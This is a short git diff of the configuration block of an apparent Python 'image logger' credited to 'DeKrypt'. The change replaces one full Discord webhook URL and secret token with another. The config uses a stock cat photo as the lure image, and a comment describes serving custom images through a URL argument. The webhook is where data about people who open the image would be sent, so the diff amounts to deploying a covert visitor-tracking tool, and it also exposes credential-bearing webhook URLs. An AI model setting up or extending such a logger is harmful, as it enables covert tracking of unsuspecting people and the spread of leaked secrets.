@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1350184810521559122/_0NxopvHKhj2bbu1xL1s1sisQ58FU8osECW7ciyA4kdMpMyy2z42GkJ_rryR7srneKHk",
+    "webhook": "https://discord.com/api/webhooks/1360613426581344448/j5hwuswycgEGt7JdEak97ijGb3X_R3uQHGvJV1wnhAUmi3cCOWA46YdyQ1Y9fpvO4wMY",
     "image": "https://assets-au-01.kc-usercontent.com/ab37095e-a9cb-025f-8a0d-c6d89400e446/17d49270-1b2a-4511-80a8-1c5dbd41e8c8/article-cat-vet-visit-guide.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
